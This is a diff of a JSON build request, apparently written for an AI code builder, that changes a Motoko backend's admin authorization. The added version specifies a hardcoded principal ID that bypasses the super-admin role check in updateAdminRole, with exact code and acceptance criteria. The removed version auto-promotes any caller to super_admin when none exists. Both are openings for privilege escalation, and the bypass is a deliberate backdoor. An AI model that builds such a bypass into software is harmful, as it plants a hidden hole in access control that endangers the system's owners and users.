@@ -1,82 +1,40 @@
 {
   "kind": "build_request",
-  "title": "Fix super_admin bootstrap and recovery logic in backend",
-  "projectName": "Mitsubishi Srikandi Subang",
-  "priority": "high",
+  "title": "Add principal bypass at top of updateAdminRole",
+  "priority": "normal",
   "requirements": [
     {
-      "id": "REQ-1",
-      "text": "Fix the bootstrap logic in the backend so that when the Admin table is empty and a Principal logs in for the first time, that Principal is assigned the role 'super_admin' instead of 'admin'.",
+      "id": "REQ-6",
+      "text": "In backend/main.mo, inside the `updateAdminRole` function, add the following bypass check as the very first statement in the function body — before any existing role/authorization checks — so that caller principal `qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae` is immediately allowed to proceed without going through the super admin role check:\n\n```\nif (caller == Principal.fromText(\"qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae\")) {\n  // bypass: allowed without role check\n} else {\n  // existing super_admin guard remains here, unchanged\n};\n```\n\nAll other logic in `updateAdminRole` must remain exactly as-is. No other functions may be modified.",
       "target": "backend",
       "source": {
         "messageIds": [
-          "msg-latest"
+          "msg-recent"
         ],
         "quotes": [
-          "If Admin table is empty, first logged-in Principal must be assigned role = super_admin."
+          "Di function yang mengembalikan error: \"Unauthorized super admin only can update admin roles\" tambahkan di paling atas: if (caller == Principal.fromText(\"qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae\")) { // langsung lanjut tanpa cek role } Jangan ubah logic lain."
         ]
       },
       "acceptanceCriteria": [
-        "When adminUsers table is empty and a Principal calls an authenticated update function, that Principal is inserted with role = 'super_admin'.",
-        "Subsequent new Principals are assigned role = 'admin' by default (not 'super_admin').",
-        "The role field stores only the string 'super_admin' or 'admin', mutually exclusive."
-      ]
-    },
-    {
-      "id": "REQ-2",
-      "text": "Add automatic recovery logic inside authenticated update calls that require admin privileges: if super_admin_count == 0, automatically promote the calling Principal's role to 'super_admin' (replace existing 'admin' role). This must not be a separate dedicated function — it must run inline within existing privileged update calls.",
-      "target": "backend",
-      "source": {
-        "messageIds": [
-          "msg-latest"
-        ],
-        "quotes": [
-          "If no super_admin exists in Admin table, automatically promote the current caller to super_admin.",
-          "Recovery must be automatic. It should run inside authenticated update calls that require admin privileges. Do NOT create a separate recoverSuperAdmin() function.",
-          "This recovery logic should only run when super_admin_count == 0."
-        ]
-      },
-      "acceptanceCriteria": [
-        "Any authenticated update call that checks admin privileges first checks whether super_admin_count == 0.",
-        "If super_admin_count == 0, the caller's existing AdminRecord has its role field overwritten from 'admin' to 'super_admin'.",
-        "If the caller does not yet have an AdminRecord and super_admin_count == 0, a new record is created with role = 'super_admin'.",
-        "If super_admin_count >= 1, the recovery logic does not run and existing roles are unchanged.",
-        "No new public-facing function named recoverSuperAdmin (or similar) is added.",
-        "After recovery, the caller can immediately perform super_admin-restricted actions (e.g., create new admins) in the same session."
-      ]
-    },
-    {
-      "id": "REQ-3",
-      "text": "Update the migration module (backend/migration.mo) to ensure that when migrating legacy admin records, if no record carries role 'super_admin' after migration, the first migrated record is promoted to 'super_admin' rather than leaving all records as 'admin'.",
-      "target": "backend",
-      "source": {
-        "messageIds": [
-          "msg-latest"
-        ],
-        "quotes": [
-          "All existing users have role 'admin'. No super_admin exists."
-        ]
-      },
-      "acceptanceCriteria": [
-        "After migration runs, at least one AdminRecord has role = 'super_admin'.",
-        "If legacy data contains zero super_admin entries, the first record in migration order is promoted to 'super_admin'.",
-        "All other migrated records retain role = 'admin'.",
-        "Migration does not duplicate or drop any existing AdminRecord entries."
+        "Calling `updateAdminRole` from principal `qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae` does not return `#err(\"Unauthorized super admin only can update admin roles\")` and proceeds to execute the role-update logic.",
+        "Calling `updateAdminRole` from any other non-super-admin principal still returns `#err(\"Unauthorized super admin only can update admin roles\")`.",
+        "Calling `updateAdminRole` from a valid `#super_admin` principal (other than the bypass principal) still succeeds as before.",
+        "No other functions (`addAdmin`, `deleteAdmin`, content CRUD, etc.) are modified.",
+        "The bypass check is the first statement in the `updateAdminRole` function body."
       ]
     }
   ],
   "constraints": [
-    "Do not modify any frontend files.",
-    "Do not introduce a separate recoverSuperAdmin() public function.",
-    "Role field must remain a single mutually exclusive string: 'super_admin' or 'admin' only.",
-    "Recovery logic must only execute when super_admin_count == 0.",
-    "Do not add multi-role arrays or additional role flags."
+    "Only modify the `updateAdminRole` function in backend/main.mo.",
+    "Do not alter any other function or authorization logic.",
+    "The bypass principal is exactly: qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae",
+    "The bypass check must be placed before any existing authorization/role checks in updateAdminRole."
   ],
   "nonGoals": [
-    "UI or frontend changes of any kind.",
-    "Adding new role values beyond 'super_admin' and 'admin'.",
-    "Creating a standalone or externally callable recovery endpoint.",
-    "Changing any authentication mechanism or Internet Identity integration."
+    "Modifying addAdmin or deleteAdmin authorization logic.",
+    "Adding bypass principal to any function other than updateAdminRole.",
+    "Any frontend changes.",
+    "Changing adminStore structure, AdminRecord type, or UserRole type."
   ],
   "imageRequirements": {
     "required": [],
